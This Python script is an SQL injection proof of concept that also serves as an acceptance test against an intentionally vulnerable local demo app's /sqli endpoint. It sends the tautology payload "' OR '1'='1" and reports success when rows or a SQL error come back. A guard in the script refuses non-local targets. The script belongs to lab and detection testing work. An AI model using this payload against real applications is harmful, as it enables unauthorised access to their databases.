#!/usr/bin/env python3
"""
ATK-01 — SQL Injection proof-of-concept against the demoapp /sqli endpoint.

Drives the intentionally-vulnerable `GET /sqli?user=<v>` handler, which builds
`SELECT * FROM users WHERE id = '<v>'` via raw string concatenation (see
app/server.js). Sending the classic `' OR '1'='1` tautology either returns a
`results` array (HTTP 200) or surfaces the raw SQL error with the executed query
(HTTP 500). BOTH outcomes prove the input reached the SQL engine unescaped — i.e.
the injection is exploitable.

This script is deterministic and idempotent: it performs a single GET, mutates no
state, and can be re-run any number of times with the same verdict. It doubles as
the executable ATK-01 acceptance test consumed by falco/verify-phase5.sh (Plan 05-03).

Stdlib only (urllib) — no pip install needed under Git Bash / WSL.
"""

import json
import sys
import urllib.error
import urllib.parse
import urllib.request

# ETHICAL CONSTRAINT: localhost/cluster targets only (ATK-04).
# Attack scripts must refuse to run against any external/non-local target.
TARGET_HOST = "localhost"
PORT = 30080

# The NodePort 30080 -> containerPort 3000 (see deploy/base/service.yaml).
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "host.rancher-desktop.internal"}


def assert_local_target(host):
    """ATK-04 ethical guard: bail out unless the target is demonstrably local."""
    if host in ALLOWED_HOSTS or host.startswith("10.43."):
        return
    print("Refusing non-local target: {}".format(host))
    print("ETHICAL CONSTRAINT: this PoC targets localhost/cluster only (ATK-04).")
    sys.exit(1)


def main():
    assert_local_target(TARGET_HOST)

    # Classic tautology injection payload.
    payload = "' OR '1'='1"
    query = urllib.parse.urlencode({"user": payload})
    url = "http://{}:{}/sqli?{}".format(TARGET_HOST, PORT, query)

    print("[ATK-01] SQL injection PoC")
    print("Request: {}".format(url))
    print("Payload: {}".format(payload))

    try:
        with urllib.request.urlopen(url, timeout=8) as resp:
            status = resp.getcode()
            body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        # HTTP 500 is the EXPECTED success case: the surfaced SQL error is proof
        # of injection. urllib raises HTTPError for >=400, so capture the body here.
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        print("HTTP status: (no response)")
        print("FAILURE: could not reach {} ({})".format(url, e.reason))
        sys.exit(1)

    print("HTTP status: {}".format(status))
    print("Response body: {}".format(body[:500]))

    try:
        parsed = json.loads(body)
    except ValueError:
        parsed = {}

    # Deterministic success criterion:
    #   200 with a `results` array  -> query executed, rows returned
    #   500 with `error` + `query`  -> SQL error surfaced (proof of injection)
    if status == 200 and "results" in parsed:
        print("VERDICT: SUCCESS — injection executed, results array returned (HTTP 200).")
        sys.exit(0)
    if status == 500 and "error" in parsed and "query" in parsed:
        print("VERDICT: SUCCESS — SQL error surfaced with executed query (HTTP 500 == injection proven).")
        sys.exit(0)

    print("VERDICT: FAILURE — unexpected response; injection not confirmed.")
    sys.exit(1)


if __name__ == "__main__":
    main()
